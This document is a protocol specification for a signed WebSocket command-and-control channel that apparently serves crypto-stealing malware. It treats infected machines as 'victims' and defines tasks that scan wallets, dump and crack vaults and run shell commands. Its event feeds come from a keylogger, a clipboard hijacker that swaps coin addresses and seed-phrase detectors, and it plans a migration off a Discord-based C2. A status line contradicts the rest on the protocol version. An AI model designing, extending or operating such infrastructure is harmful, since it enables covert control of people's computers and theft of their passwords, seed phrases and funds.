# SPC Control Channel v1.2 — WebSocket

Status: **v2 additive**. `v` vale 2; frames de capacidad llegan con su feature.
Control only. Artifacts, chunks, commit, enroll and
`POST /tasks/:id/result` stay on the signed HTTP API of `CONTRACT.md`; **no artifact
byte ever travels in a WS frame**. Schema: `contract/v2/ws-schemas.json`.
Validator: `contract/v1/ws-validate.ts`. HMAC harness annex: `contract/v1/ws-hmac.py`.

- `POST /api/v1/ws-ticket` → `wss://<panel>/api/v1/ws?ticket=<t>&device_id=<u>&expect_seq_in=<n>`
- UTF-8, one JSON object per text frame, no BOM, max **262144** bytes
- `v = 1`; `seq` is `u64` in `1..9007199254740991`
- Ticket TTL 30 s; handshake/ACK deadline 5 s; ping 20 s; pong deadline 45 s
- Max 4 `cmd` in flight; frame rate 240/min burst 40; 12 tickets/min; 3 tickets/device
- Dedup window 1024 **per direction**; nonce window 600 **per direction**, purge 600 s

## Reserved keys

These envelope keys are reserved and MUST NOT be reused as type fields:
`v, id, seq, ts, type, nonce, reply_to, body, sig`.

## Changes

- v1: initial control channel, HMAC per frame, persisted cursor.
- v1.1: version gate, busy/timeout, 4409, floor, per-direction nonce, deterministic
  concatenation, ticket lifecycle, symmetric hello_ok.
- v1.2: `result` body nested, transport-only ACK, explicit validation order, per-direction
  nonce windows, skew on both ends, 4409 state rule, ticket eviction, panel `bye`,
  agent-only ping, HMAC failure log, HTTP-only task list.

## 0. Keys and ticket

```text
ticket_secret = base64url_decode(ticket)
K_c2a = HKDF-SHA256(ticket_secret, salt=handshake_nonce, info="spc-ws-v1/c2a", 32)
K_a2c = HKDF-SHA256(ticket_secret, salt=handshake_nonce, info="spc-ws-v1/a2c", 32)
```

`POST /api/v1/ws-ticket` uses `VictimHmac` over an empty body. `201` returns
`{ticket, expires_in:30, handshake_nonce, device_id}`. `device_id` is the victim UUID.
Single use, atomic. At most **three** live tickets per device: the fourth **evicts the
oldest and still returns `201`**. `401`/`403`/`429` on issue.

The ticket is consumed atomically on the `101`. Both keys are derived once, immediately
after the `101`, and never re-derived. `hello_ok` renews neither ticket nor keys.

## 1. Handshake

```text
agent                                  panel
  | POST /api/v1/ws-ticket (signed)      |
  | 201 ticket + nonce + device_id       |
  | WSS ...?ticket&device_id&expect...   |
  |            (ticket consumed, 101)    |
  | hello_ok (K_c2a, seq=max(out,expect)+1)
  | ack (reply_to=hello_ok.id)           |
  | hello (K_a2c, seq=hello_ok.expect_seq_in+1)
  | ack (reply_to=hello.id)              |
```

1. Missing/unknown/expired/reused ticket or `device_id` mismatch → `bye` **4401**.
   Non-WebSocket request → HTTP **426**, not a close code.
2. `hello_ok` carries `server_time`, `heartbeat_sec`, `poll_sec`, `expect_seq_in`,
   `expect_seq_out` (plus envelope `v`). Missing `expect_seq_in`/`expect_seq_out`
   means `0`. First connection of a device: both directions start at `1`.
3. Reconciliation is bidirectional:
   - `hello_ok.expect_seq_in` = last seq accepted from the agent; agent sends
     `hello.seq = that + 1`.
   - `hello_ok.expect_seq_out` = last a2c seq processed and ACKed; agent resets its
     inbound floor to it.
   - `hello.expect_seq_in` = last seq accepted from the panel; panel sends next frame
     at `max(hello_ok.seq, that) + 1`.
4. Agent ACKs `hello_ok`, then sends `hello`, each within 5 s; miss → **4408**.
5. **Before `hello_ok` the panel accepts only `ack` and `bye`.** Any other type →
   **4400**.
6. New authenticated connection for the same `device_id` supersedes the old:
   `bye {code:4409, reason:"superseded"}` and close **4409**. On supersede, the new
   `hello_ok.expect_seq_out` comes from the **persisted** panel outbound cursor, not
   from the socket that is dying. The expelled connection MUST NOT write cursor state.
   Reconnect after 4409: 5–10 s jitter; three consecutive 4409 double the backoff.
7. Revoked victim/build → **4403**. Identity is `device_id` + ticket + HMAC; IP and
   the label `sync-<host>-<user>` are informational.

## 2. Frame, validation order and HMAC

Key order is fixed:

```text
v, id, seq, ts, type, nonce, <type fields in schema order>, sig
```

`reply_to` is the first type field on `ack`, `pong`, `result`. Frames are built by
concatenation, never by serializing an object. Escaping: only `"` → `\"`, `\` → `\\`,
and control `<0x20` (`\b \f \n \r \t`, others lowercase `\u00xx`). No escape for
`>=0x20` or non-ASCII. `sig` is always last.

`payload` = every byte before the literal `,"sig":`, byte for byte. HMAC input:

```text
ascii(decimal(seq)) || 0x1F || nonce || 0x1F || payload
sig = base64url(HMAC-SHA256(direction_key, input))
```

`c2a` uses `K_c2a`, `a2c` uses `K_a2c`; verify constant-time. Failure → `bye` **4401**,
nothing dispatched. Log one line with `code`, `device_id`, `seq` and frame byte
`length`; never the payload or key.

### Receiver order

Every check rejects immediately, in this order; no later check runs:

1. frame length `<= 262144`
2. valid UTF-8 JSON object
3. `v == 1`
4. HMAC over `seq|0x1F|nonce|0x1F|payload`
5. `nonce` unseen in **that direction**
6. `seq` strictly greater than the last accepted in that direction and above the floor
7. `type` known
8. required fields for that type
9. dispatch

`v` is checked before `id`; an unknown `v` is never used for dedup.

### Replay, clock, nonce

- 16 random bytes per nonce, unique per sender **per direction** for the connection.
- Each direction keeps its own sliding set of the last ≥600 nonces and purges by age at
  600 s. A shared set would let a panel burst evict agent nonces.
- Repeated nonce → **4400**; `ts` outside ±300 s → **4400** `clock_skew`.
- **Both ends enforce skew.** `server_time` in `hello_ok` is the panel anchor; the
  agent uses it to estimate local drift. It does not change the ±300 s rule.
- Known `id` → re-ACK, skip nonce and seq.

## 3. Sequence, cursor, dedup

- One counter per direction, persisted; strictly increasing, gaps allowed.
- Dedup window 1024 per direction. Duplicate `id` → re-ACK only.
- Floor = `max_in_seq - 1024`; unknown `id` at/below the floor → **4400**
  (`seq_below_floor`). The sender resets its sequence to `0`, reconnects with
  `expect_seq_in` absent and performs a full `hello`.
- Missing `expect_seq_in` = `0` in query, `hello` and `hello_ok`.

## 4. Types

Fields are top-level and ordered as the schema. Only `result` has a nested `body`.

### `hello` (agent → panel)

`hostname, user, os, cpu, ram, gpu, resolution, java, agent, public_ip, path, first,
expect_seq_in` — strings except `first` (bool) and `expect_seq_in` (u64). `public_ip` is
`"unknown"` on failure. Requires ACK.

### `hello_ok` (panel → agent)

`server_time, heartbeat_sec, poll_sec, expect_seq_in, expect_seq_out`. Requires ACK.

### `cmd` (panel → agent)

`name, args, task_id, timeout_ms` — `name` is one of the task names in `task-schemas.json`; `args` is
exactly that name's `params` in `task-schemas.json`; `task_id` is a UUID; `timeout_ms`
defaults `30000`, max `300000`. Requires ACK before execution.

- 4 in flight max (ACKed, no result yet). The fifth is ACKed and **after the ACK**
  answered with `result` `body {status:"error", error:"busy", result:{}, artifacts:[]}`.
  No queue, no silent drop.
- The **agent owns the four-in-flight limit**. The panel sends every `cmd` and only
  counts in-flight for the UI and the handshake flush; it has no local gate, so the
  fifth always reaches the agent and gets `busy`.
- `timeout_ms` is a hard deadline from the ACK on both ends. Agent cancels locally and
  emits `result` `body {status:"error", error:"timeout", ...}`; panel waits 5 s more and
  drops later results for that `reply_to`. The discard window is in memory only; the
  durable dedup is the task id plus terminal state in Postgres, so a late result after
  a restart is rejected by the task row.
- `agent {command:"reconnect"}` sends `bye {code:1000, reason:"reconnect"}` and
  then a Close `1000` once its `result` is ACKed, with a 2 s cap that uses the same
  bye + Close. `1000` is a normal close, not a bare/dry one; the agent reconnects
  with normal backoff. If no result arrives in the deadline, the panel closes that
  task as `unknown`, not `timeout`.
- Legacy `task <name> <base64url-json>` stays accepted by the agent parser.
- **No offline queue.** A due task for a device without a ready socket is rejected
  at the edge with `409 agent_offline` and `victim_ids`; nothing old runs blind on
  the next hello. Only a scheduled task (`not_before`) stays queued; its FIFO, cap,
  TTL and `expired` rule live in `openapi.yaml` under `/tasks`.
- `agent` is its own type: its `command` runs the agent-console allowlist only and
  never falls back to the OS shell. `agent {command:"shell whoami"}` is an allowlist
  error (the output says `allowlist: unknown agent command: shell`), not shell
  output. `agent {command:"reconnect"}` restarts only the Discord gateway and
  answers in one line.

### `result` (agent → panel)

`reply_to` + `body`. `reply_to` is the `cmd.id`. `body` is inserted as the exact JSON
literal of `CryptoModule.java:1426-1441` (UTF-8 bytes, no reserialization):
`{status, error, result, artifacts}`.

- `status`: `ok|error|cancelled`; `error` nullable; `result` object; `artifacts` =
  `[{"upload_request":uuid}]`.
- `error:"timeout"` carries `result:{}` and `artifacts:[]`. Consumers inspect
  `status`/`error` before touching `result`; an empty result is not a success.
- A task closed as `unknown` is terminal too and is never leased again by
  `GET /tasks`.
- The panel closes the task on receipt.
- The shape does **not** carry `ok`; use `status`.
- `http_only` tasks (§5) always POST the body and send
  `body {status:"ok", error:null, result:{"http_result":true}, artifacts:[]}`.
  Other tasks send the body by frame if ≤256 KiB; above that they POST it.
- Requires ACK; pending results persist in `cache/ws/pending/` and re-sign on reconnect.

### `event` (agent → panel)

`kind, data, legacy`. `data` typed; `legacy` is the exact old text. The payload
table, emitter map and legacy rule are §6.5. Requires ACK; pending events persist
like results.

### `ack` (both) / `ping` / `pong`

`ack`: only `reply_to`. **ACK is transport, not execution**: it means "received and
accepted", not "succeeded". An ACKed command can still fail, expire or be rejected.
Never ACKed; duplicate frame → re-ACK, no dispatch.

`ping`: empty body. **Only the agent sends `ping`** every 20 s; the panel only answers
`pong`. `pong`: `reply_to` = ping `id`; never ACKed. No pong in 45 s → **4408**.
Ping/pong are exempt from the frame limit.

### `bye`

`code, reason`. Both ends may send it. Not ACKed; followed by Close with the same code,
except **4500**, which never uses `bye`. The panel uses `bye` for 4401/4403 during the
handshake, 4408 on pong timeout and 4429 on rate limit. A panel `bye` follows the same
rule: the agent reconnects with normal backoff (never immediate). After `bye` the panel
marks the device offline cleanly, not error.

## 5. HTTP-only results

These task names **always** deliver the real result through
`POST /api/v1/tasks/{task_id}/result`; the frame carries only a marker body:

`scan_wallets, dump_vault, crack_vault, shell, agent`

The rest may use the frame. All names remain in the `cmd` schema with `$ref` to
`task-schemas.json`. Each type carries `transport: "http"` or `transport: "frame"`
there; a missing `transport` means `frame`, and the panel rejects the name at the
edge if the field is absent or unknown. The panel rejects any name outside the
eleven before dispatch.

## 6. Delivery, retry, closure

1. On `cmd/result/event/hello`: persist cursor/dedup, ACK ≤5 s, then dispatch. A
   `busy` rejection is emitted **after** the ACK, never before.
   Before the ACK the agent writes the full `cmd` to `cache/ws/pending/<id>.json`; on
   startup, pending ids absent from the completed dedup are dispatched.
2. No ACK in 5 s → retransmit identical bytes (same `id`, `seq`, `nonce`, `sig`), 3
   times. After reconnect re-sign with new `seq`/`nonce`, same `id`. Exhausted → **4408**.
3. Results/events are kept until ACKed, max 24 h. Dedup is on disk/DB.
4. A crash mid-command loses the result; the panel lease expires the task.

### Close codes

| Code | Meaning |
|---|---|
| `1000` | normal shutdown |
| `4400` | protocol: JSON/`v`/field/seq/nonce/floor/oversize/unknown type/clock_skew |
| `4401` | auth: ticket, HMAC |
| `4403` | revoked victim/build |
| `4408` | handshake/pong/ACK timeout |
| `4409` | superseded |
| `4429` | rate limit; `reason` carries `retry_after_ms` |
| `4500` | internal, bare Close only |

Backoff `1 s → 60 s` ±20 %; one socket; third consecutive failure re-resolves
`resolver_url`; cached endpoint has TTL.

### 6.5 `event` payloads and emitters

`kind`, `data` and `legacy` are required. `data` is typed and closed; the table is
authoritative and matches `ws-schemas.json`.

| kind | data |
|---|---|
| `wallet_detected` | `{name, pid, title?}` |
| `wallet_closed` | `{pid}` |
| `password` | `{process, title, text}` |
| `clipboard_secret` | `{kind, value, process?, title?, words?}`; kind ∈ `seed-12 seed-24 xprv evm-key solana-key password` |
| `clipboard_replace` | `{coin, original, replacement}` |
| `seed_found` | `{words, value}` |
| `secret_found` | `{secret_kind, value, confident}`; secret_kind ∈ `bip39-24 bip39-12 xprv solana evm-key hex64 other`, `confident` boolean |

`secret_found.secret_kind` and `clipboard_secret.data.kind` are different
vocabularies; do not map one onto the other.

`legacy` is the text the detector already produced, byte for byte, with no
rewriting. A notice that was two messages keeps both original byte sequences in
order, joined by a single `\n`, without trimming (both `bip39` branches).

| Origin | Line | kind |
|---|---|---|
| WalletWatcher | 239 | `wallet_detected` |
| WalletWatcher | 305 | `wallet_closed` |
| WalletWatcher | 519-554 | `seed_found` for `bip39-24`/`bip39-12`; otherwise `secret_found` |
| Keylogger | 369 | `password` |
| ClipboardHijacker | 195 (text built at SecretDetector 84-94) | `clipboard_secret` |
| ClipboardHijacker | 172 | `clipboard_replace` |

## 7. Limits and 426

Frame >262144 → **4400** (`frame_too_large`). Excess frames → `bye 4429`. `/ws` and
`/ws-ticket` are exempt from the console 600/min.

**426 is not a socket close code, does not count as an attempt and does not trigger
backoff: log it and wait 5 min before a new ticket.**

## 8. Discord → WS mapping

`busy` is emitted after the ACK; the ACK is transport-only. An ACKed `cmd` can still
fail, expire or be rejected.

| Discord today | v1.2 |
|---|---|
| webhook multipart `payload_json`+`file` | unchanged HTTP |
| `POST /channels/{id}/messages` reply | `result` / `event` |
| `MESSAGE_CREATE` / `GET messages?after=` | `cmd` + persisted cursor |
| `task <name> <base64url>` | `cmd.name` + `cmd.args` |
| `result-<name>-<id>.json` | `result` / HTTP-only list |
| `Task <name> queued` | `ack` |
| `✅` reaction | `ack` |
| `typing` | no gesture |
| embed `hello` | `hello` |
| `wallet detected:`/`password?`/`clipboard:` | `event` + `legacy` |
| `allowedUsers`/webhook trust | ticket + HMAC |
| `sync-<host>-<user>` | `hello.hostname`/`hello.user` |
| channel deletion recovery | 4409 + ticket retry |

## 9. Vector and harness

```text
ticket_secret   AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8
handshake_nonce ICEiIyQlJicoKSorLC0uLw
K_c2a           aWxBSLLuukIwQwveTvytyqhoRprD4daFCytDfxxFZ5c
seq             1841
nonce           QEFCQ0RFRkdISUpLTE1OTw
payload         {"v":1,"id":"3f0c4b5e-7a21-4c8d-9e11-2b6a8d0c4f77","seq":1841,"ts":1767225600,"type":"cmd","nonce":"QEFCQ0RFRkdISUpLTE1OTw","name":"shell","args":{"command":"whoami"},"task_id":"9b2f1a34-5c6d-4e7f-8a90-1b2c3d4e5f60","timeout_ms":65000}
input_hex       313834311f5145464351305246526b64495355704c5445314f54771f7b2276223a312c226964223a2233663063346235652d376132312d346338642d396531312d326236613864306334663737222c22736571223a313834312c227473223a313736373232353630302c2274797065223a22636d64222c226e6f6e6365223a225145464351305246526b64495355704c5445314f5477222c226e616d65223a227368656c6c222c2261726773223a7b22636f6d6d616e64223a2277686f616d69227d2c227461736b5f6964223a2239623266316133342d356336642d346537662d386139302d316232633364346535663630222c2274696d656f75745f6d73223a36353030307d
input_sha256    627d7fd7961213f909f29b663e223ae22a2a0c072bf1d220b0324d027640382a
sig             Qs5y-gv3masCumW9Xa7GCJhfHac5OwLuXw3AHmp19-Y
```

Frame = payload + `,"sig":"Qs5y-gv3masCumW9Xa7GCJhfHac5OwLuXw3AHmp19-Y"}`.

Annex harness:

```sh
python3 contract/v1/ws-hmac.py
```

`ws-schemas.json` has `negative_examples`: second frame of the connection repeating the
first nonce and `v:2`. `ws-validate.ts` checks positives, negatives, order and the
stateful nonce rule.
